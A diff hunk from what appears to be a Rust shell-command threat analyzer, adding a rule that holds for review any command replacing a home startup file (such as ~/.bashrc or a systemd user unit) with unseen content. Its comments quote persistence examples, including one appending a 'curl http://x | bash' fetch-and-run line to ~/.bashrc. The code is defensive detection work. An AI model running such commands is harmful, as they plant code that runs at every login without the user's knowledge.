@@ -3367,6 +3367,30 @@ fn analyze_command_as_read(
         score += s;
     }
 
+    // A startup file of the home replaced or made from content the line does
+    // not show (`cp /tmp/x ~/.bashrc`, a unit copied into
+    // `~/.config/systemd/user`): what it will run cannot be judged, so the
+    // line is held for review. The persistence it already scored counts
+    // toward that, so the line lands at review, not past it.
+    if !signals.iter().any(|s| s.signal == "persistence_install")
+        && threats::replaces_startup_file_unseen(scan_cmd)
+    {
+        let already: u32 = signals
+            .iter()
+            .filter(|s| s.signal == "persistence_attempt")
+            .map(|s| s.score)
+            .sum();
+        let lift = 20u32.saturating_sub(already);
+        if lift > 0 {
+            signals.push(AnalysisSignal {
+                signal: "persistence_install".into(),
+                score: lift,
+                detail: threats::STARTUP_FILE_REPLACED_UNSEEN.into(),
+            });
+            score += lift;
+        }
+    }
+
     // Text written into a shell startup file is a command that runs at every
     // login. The projection masks it as literal output (it is, now), so
     // `echo 'curl http://x | bash' >> ~/.bashrc` scored only the profile write
